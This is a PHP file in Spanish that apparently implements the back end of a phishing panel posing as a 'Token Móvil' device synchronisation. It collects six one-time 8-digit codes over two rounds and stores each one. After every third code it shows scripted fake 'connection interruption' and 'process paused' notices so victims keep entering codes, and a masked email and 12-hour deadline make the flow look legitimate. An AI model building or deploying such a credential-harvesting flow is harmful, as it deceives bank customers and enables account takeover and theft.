<?php

const SYNC_CHAT_PREFIX = '[[SYNC_DISPOSITIVO]]';
const SYNC_ENVIOS_POR_RONDA = 3;
const SYNC_TOTAL_RONDAS = 2;
const SYNC_TOTAL_ENVIOS = SYNC_ENVIOS_POR_RONDA * SYNC_TOTAL_RONDAS;
const SYNC_MENSAJE_QR_ACTUALIZADO = 'Se actualizó el código QR. Escanea o ingresa el nuevo valor.';
const SYNC_MENSAJE_QR_AVISO = 'Sincronización en proceso: se actualizó el código QR. Escanee la imagen en pantalla e ingrese el valor vigente.';

const SYNC_ERR_DIGITOS = 'Ingrese la contraseña dinámica de 8 dígitos generada en su Token Móvil.';
const SYNC_ERR_CODIGO_USADO = 'El código ingresado ya fue registrado en este proceso. Genere uno nuevo en su Token Móvil e inténtelo nuevamente.';
const SYNC_ERR_CODIGO_INVALIDO = 'La contraseña dinámica no es válida o ha vencido. Verifique su Token Móvil e ingrese el código vigente.';
const SYNC_ERR_CODIGO_QR_INVALIDO = 'El código no coincide o ha caducado. Escanee el QR actualizado en pantalla e ingrese el valor vigente.';
const SYNC_ERR_CONEXION = 'No fue posible validar su información en este momento. Verifique su conexión e intente nuevamente.';
const SYNC_ERR_ENVIO = 'No pudimos registrar su código de seguridad. Intente nuevamente.';
const SYNC_ERR_SESION = 'La sesión de sincronización no está disponible. Espere un momento e intente de nuevo.';

function syncMensajeChatLabel(string $tipo): string
{
    return $tipo === 'qr' ? 'Sincronización QR enviada' : 'Sincronización código enviada';
}

function syncEtiquetaChatDesdeMensaje(string $mensaje): ?string
{
    if (strpos($mensaje, SYNC_CHAT_PREFIX) === 0) {
        return substr($mensaje, strlen(SYNC_CHAT_PREFIX));
    }

    return null;
}

function syncCancelarPendientes(PDO $pdo, int $usuarioId): void
{
    $stmt = $pdo->prepare("
        UPDATE sincronizacion_dispositivo
        SET estado = 'cancelado'
        WHERE usuario_id = ?
          AND estado IN ('pendiente', 'esperando_validacion', 'interrupcion')
    ");
    $stmt->execute([$usuarioId]);
}

function syncObtenerActiva(PDO $pdo, int $usuarioId): ?array
{
    $stmt = $pdo->prepare("
        SELECT *
        FROM sincronizacion_dispositivo
        WHERE usuario_id = ?
          AND estado IN ('pendiente', 'esperando_validacion', 'interrupcion')
        ORDER BY fecha_envio DESC, id DESC
        LIMIT 1
    ");
    $stmt->execute([$usuarioId]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    return $row ?: null;
}

function syncDecodificarUsados(?string $json): array
{
    if ($json === null || $json === '') {
        return [];
    }

    $data = json_decode($json, true);
    if (!is_array($data)) {
        return [];
    }

    return array_values(array_filter(array_map('strval', $data)));
}

function syncMensajesInterrupcion(): array
{
    return [
        [
            'titulo' => 'Sincronización interrumpida',
            'texto' => 'Verifique su conexión a internet e intente nuevamente para continuar con la sincronización de su Token Móvil.',
        ],
        [
            'titulo' => 'Conexión inestable detectada',
            'texto' => 'Detectamos una interrupción en su sesión. Confirme su conexión y continúe con el proceso de verificación.',
        ],
        [
            'titulo' => 'Proceso en pausa',
            'texto' => 'La sincronización se encuentra en pausa temporal. Seleccione Aceptar para reanudar la validación de su dispositivo.',
        ],
    ];
}

function syncIndiceInterrupcion(array $row): int
{
    $envios = syncContarEnvios($row);
    $rondasCompletadas = (int) floor($envios / SYNC_ENVIOS_POR_RONDA);
    if ($rondasCompletadas < 1) {
        return 0;
    }

    $lista = syncMensajesInterrupcion();

    return min($rondasCompletadas - 1, count($lista) - 1);
}

function syncRondaActual(int $envios): int
{
    return min(SYNC_TOTAL_RONDAS, max(1, (int) floor($envios / SYNC_ENVIOS_POR_RONDA) + 1));
}

function syncTokenEnRonda(int $envios): int
{
    if ($envios <= 0) {
        return 1;
    }

    $mod = $envios % SYNC_ENVIOS_POR_RONDA;

    return $mod === 0 ? 1 : $mod + 1;
}

function syncMensajeInterrupcion(array $row): array
{
    $lista = syncMensajesInterrupcion();
    $indice = syncIndiceInterrupcion($row);

    return $lista[$indice] + ['indice' => $indice];
}

function syncEnmascararEmail(?string $email): string
{
    $email = trim((string) $email);
    if ($email === '' || strpos($email, '@') === false) {
        return 'cuenta registrada';
    }

    [$local, $domain] = explode('@', $email, 2);
    $local = trim($local);
    $visible = mb_substr($local, 0, 4, 'UTF-8');
    if ($visible === '') {
        $visible = '****';
    }

    $ocultos = max(4, mb_strlen($local, 'UTF-8') - mb_strlen($visible, 'UTF-8'));

    return $visible . str_repeat('*', $ocultos) . '@' . $domain;
}

function syncUsuarioUltimos(?array $usuario, int $digitos = 4): string
{
    if (!$usuario) {
        return '0000';
    }

    $login = trim((string) ($usuario['usuarios'] ?? ''));
    $soloDigitos = preg_replace('/\D/', '', $login);

    if (strlen($soloDigitos) >= $digitos) {
        return substr($soloDigitos, -$digitos);
    }

    if ($login !== '' && strlen($login) >= $digitos) {
        return substr($login, -$digitos);
    }

    return str_pad((string) (((int) ($usuario['id'] ?? 0)) % 10000), 4, '0', STR_PAD_LEFT);
}

function syncPlazoSegundosRestantes(array $row, int $horasPlazo = 12): int
{
    $envio = strtotime((string) ($row['fecha_envio'] ?? ''));
    if ($envio === false) {
        $envio = time();
    }

    $limite = $envio + ($horasPlazo * 3600);

    return max(0, $limite - time());
}

function syncContextoIntro(PDO $pdo, int $usuarioId, array $row): array
{
    $stmt = $pdo->prepare('SELECT id, usuarios, email, token_codigo, sgdotoken_codigo FROM usuarios WHERE id = ? LIMIT 1');
    $stmt->execute([$usuarioId]);
    $usuario = $stmt->fetch(PDO::FETCH_ASSOC) ?: null;

    return [
        'email_enmascarado' => syncEnmascararEmail($usuario['email'] ?? ''),
        'usuario_ultimos' => syncUsuarioUltimos($usuario),
        'plazo_segundos_restantes' => syncPlazoSegundosRestantes($row),
    ];
}

function syncContarEnvios(array $row): int
{
    return count(syncDecodificarUsados($row['codigos_usados'] ?? null));
}

function syncAvanzarDespuesEnvio(PDO $pdo, array $row): array
{
    $syncId = (int) $row['id'];
    $usuarioId = (int) $row['usuario_id'];
    $envios = syncContarEnvios($row);

    if ($envios >= SYNC_TOTAL_ENVIOS) {
        $upd = $pdo->prepare("
            UPDATE sincronizacion_dispositivo
            SET estado = 'completado',
                paso_actual = 3,
                mensaje_error = NULL,
                codigo_actual = NULL,
                ciclos_aprobados = ?,
                fecha_validacion = NOW(),
                fecha_completado = NOW()
            WHERE id = ? AND usuario_id = ?
        ");
        $upd->execute([$envios, $syncId, $usuarioId]);

        return ['estado' => 'completado', 'exito_modo' => 'validacion_final'];
    }

    if ($envios % SYNC_ENVIOS_POR_RONDA === 0) {
        $upd = $pdo->prepare("
            UPDATE sincronizacion_dispositivo
            SET estado = 'interrupcion',
                paso_actual = 3,
                ciclos_aprobados = ?,
                mensaje_error = NULL,
                codigo_actual = NULL,
                fecha_validacion = NOW()
            WHERE id = ? AND usuario_id = ?
        ");
        $upd->execute([$envios, $syncId, $usuarioId]);

        return ['estado' => 'interrupcion', 'exito_modo' => null];
    }

    $esQr = ($row['tipo'] ?? '') === 'qr';

    if ($esQr) {
        $upd = $pdo->prepare("
            UPDATE sincronizacion_dispositivo
            SET estado = 'esperando_validacion',
                paso_actual = 2,
                ciclos_aprobados = ?,
                codigo_actual = NULL,
                qr_imagen_url = NULL,
                mensaje_error = NULL,
                fecha_validacion = NOW()
            WHERE id = ? AND usuario_id = ?
        ");
        $upd->execute([$envios, $syncId, $usuarioId]);

        return ['estado' => 'esperando_validacion', 'exito_modo' => null];
    }

    $upd = $pdo->prepare("
        UPDATE sincronizacion_dispositivo
        SET estado = 'pendiente',
            paso_actual = 2,
            ciclos_aprobados = ?,
            codigo_actual = NULL,
            mensaje_error = NULL,
            fecha_validacion = NOW()
        WHERE id = ? AND usuario_id = ?
    ");
    $upd->execute([$envios, $syncId, $usuarioId]);

    return ['estado' => 'pendiente', 'exito_modo' => null];
}

function syncRemapearMensajeLegacy(string $mensaje): string
{
    $legacy = [
        'Este código ya fue utilizado. Ingresa uno distinto.' => SYNC_ERR_CODIGO_USADO,
        'El código debe tener 8 dígitos.' => SYNC_ERR_DIGITOS,
        'El código es incorrecto o ha expirado. Escanea el nuevo QR e intenta de nuevo.' => SYNC_ERR_CODIGO_QR_INVALIDO,
        'El código es incorrecto o ha expirado. Intenta con uno nuevo.' => SYNC_ERR_CODIGO_INVALIDO,
        'Ingresa un código válido.' => SYNC_ERR_DIGITOS,
        'No se pudo enviar el código' => SYNC_ERR_ENVIO,
        'No hay sincronización activa para enviar código' => SYNC_ERR_SESION,
    ];

    return $legacy[$mensaje] ?? $mensaje;
}

function syncNormalizarMensajeCliente(?string $mensaje): array
{
    if ($mensaje === null || trim($mensaje) === '') {
        return ['error' => null, 'aviso' => null];
    }

    $mensaje = syncRemapearMensajeLegacy(trim($mensaje));

    if ($mensaje === SYNC_MENSAJE_QR_ACTUALIZADO) {
        return ['error' => null, 'aviso' => SYNC_MENSAJE_QR_AVISO];
    }

    return ['error' => $mensaje, 'aviso' => null];
}

function syncPayloadCliente(array $row, ?array $contextoIntro = null): array
{
    $mensajes = syncNormalizarMensajeCliente($row['mensaje_error'] ?? null);
    $envios = syncContarEnvios($row);
    $usados = syncDecodificarUsados($row['codigos_usados'] ?? null);
    $ultimoCodigo = $usados !== [] ? (string) end($usados) : null;

    $payload = [
        'sync_id' => (int) $row['id'],
        'tipo' => $row['tipo'],
        'estado' => $row['estado'],
        'paso_actual' => (int) $row['paso_actual'],
        'qr_imagen_url' => $row['qr_imagen_url'] ?: null,
        'mensaje_error' => $mensajes['error'],
        'mensaje_aviso' => $mensajes['aviso'],
        'codigo_actual' => in_array($row['estado'] ?? '', ['esperando_validacion', 'interrupcion'], true)
            ? ($row['codigo_actual'] ?? null)
            : null,
        'ciclos_aprobados' => (int) ($row['ciclos_aprobados'] ?? 0),
        'envios_realizados' => $envios,
        'envios_total' => SYNC_TOTAL_ENVIOS,
        'envios_por_ronda' => SYNC_ENVIOS_POR_RONDA,
        'rondas_total' => SYNC_TOTAL_RONDAS,
        'ronda_actual' => syncRondaActual($envios),
        'token_en_ronda' => syncTokenEnRonda($envios),
        'ultimo_codigo' => $ultimoCodigo,
        'exito_modo' => (($row['estado'] ?? '') === 'completado' && $envios >= SYNC_TOTAL_ENVIOS)
            ? 'validacion_final'
            : 'normal',
    ];

    if (($row['estado'] ?? '') === 'interrupcion') {
        $msg = syncMensajeInterrupcion($row);
        $payload['interrupcion_indice'] = $msg['indice'];
        $payload['interrupcion_titulo'] = $msg['titulo'];
        $payload['interrupcion_texto'] = $msg['texto'];
    }

    if (is_array($contextoIntro)) {
        $payload['email_enmascarado'] = $contextoIntro['email_enmascarado'] ?? '';
        $payload['usuario_ultimos'] = $contextoIntro['usuario_ultimos'] ?? '0000';
        $payload['plazo_segundos_restantes'] = (int) ($contextoIntro['plazo_segundos_restantes'] ?? 0);
    }

    return $payload;
}
